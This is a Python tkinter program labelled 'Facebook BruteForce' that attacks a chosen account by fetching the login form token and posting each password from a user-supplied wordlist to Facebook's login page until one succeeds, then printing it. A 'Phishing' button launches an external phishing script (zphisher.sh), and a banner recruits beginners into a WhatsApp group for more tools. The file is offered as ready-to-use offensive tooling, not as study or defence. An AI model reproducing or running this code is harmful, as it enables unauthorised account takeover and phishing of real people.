#Import tkinter library
from tkinter import *
from tkinter import ttk
from tkinter import filedialog
from time import strftime

def time():

	string = strftime('%H:%M:%S %p')
	lbl.config(text = string)
	lbl.after(1000, time)
	
def phish():
	import os
	os.system("bash zphisher.sh")
def activate():

	import os.path
	import requests
	from bs4 import BeautifulSoup
	import sys

	if sys.version_info[0] != 3:
	    print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 
	    fb.py\n\t--------------------------------------''')
	    sys.exit()

	PASSWORD_FILE = path
	MIN_PASSWORD_LENGTH = 6
	POST_URL = 'https://www.facebook.com/login.php'
	HEADERS = {
	    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
	}
	PAYLOAD = {}
	COOKIES = {}


	def create_form():
	    form = dict()
	    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

	    data = requests.get(POST_URL, headers=HEADERS)
	    for i in data.cookies:
                cookies[i.name] = i.value
	    data = BeautifulSoup(data.text, 'html.parser').form
	    if data.input['name'] == 'lsd':
                form['lsd'] = data.input['value']
	    return form, cookies


	def is_this_a_password(email, index, password):
	    global PAYLOAD, COOKIES
	    if index % 10 == 0:
                PAYLOAD, COOKIES = create_form()
                PAYLOAD['email'] = email
	    PAYLOAD['pass'] = password
	    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
	    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
                open('temp', 'w').write(str(r.content))
                print('\npassword found, the password is: ', password)
                #firefox www.facebook.com
                return True
	    return False


	if __name__ == "__main__":
	    print('\n---------- Welcome To Facebook BruteForce ----------\n')
	    if not os.path.isfile(PASSWORD_FILE):
                print("Password file is not exist: ", PASSWORD_FILE)
                sys.exit(0)
	    password_data = open(PASSWORD_FILE, 'r').read().split("\n")
	    print("Password file selected: ", PASSWORD_FILE)
	    #email = input('Enter Email/Username to target: ').strip()
	    email=pr
	    for index, password in zip(range(password_data.__len__()), password_data):
                password = password.strip()
                if len(password) < MIN_PASSWORD_LENGTH:
                   continue
                print("Trying password [", index, "]: ", password)
                if is_this_a_password(email, index, password):
                    break




















	pass
def print_file():
	global pr
	pr=E1.get()
	print("username:", pr)


def open_files():
	global path
	path= filedialog.askopenfilename(title="Select a file", filetypes=(("text files","*.txt"),("all files","*.*")))
	print("wordlist:", path)
	#button.config(state=DISABLED)
	#label.config(text=path, font=('comicsansms 19 bold'))
	#button.config(state=DISABLED)
	button=Button(root, text="activate", command=activate,bg="red",fg="blue",font="comicsansms 19 bold", padx=5).grid(row=3)
	#button.config(state=DISABLED)
	#label.config(text=path, font=('comicsansms 19 bold'))
	root.geometry("430x320+25+105")
   
   
   
root= Tk()

root.title("facebook")
root.geometry("430x320+25+105")
root.resizable(0,0)


lbl = Label(root, font = ('calibri',15, ' '),
background = 'purple',
foreground = 'white')
lbl.grid(row=0,column=1,sticky="w")
time()





button2=Button(root,text="Phishing",fg="blue",bg="skyblue",command=phish,font="comicsansms 19 bold").grid(row=1,column=1,sticky="w")

L1 = Label(root, text="User Name")
L1.grid(row=0,column=0,sticky="s")
E1 = Entry(root)
E1.grid(row=1,column=0)
button=Button(root,text="print",command=print_file,padx=10).grid(row=2,column=0)



label= Label(root,text="", font=('Courier 13 bold'))
label.grid()
button= Button(root, text="browse wordlist",bg="blue",fg="white",font="comicsansms 19 bold",command=open_files,padx=20,pady=10)
button.grid(row=3,column=0,sticky="n")
#button.config(state=DISABLED)
label=Label(root,text=
'''
dear noobs,(me too)
for any kind of help, 
you can contact us
contact: +9779809642422
you can join our whatsapp group
after sending a msg
we give all necessasy thing free 
which we have,
but,
do anything with
your own
responsibility
Mr.Rishi

''',bg="yellow").grid(row=3,column=1,sticky="w")

root.mainloop()
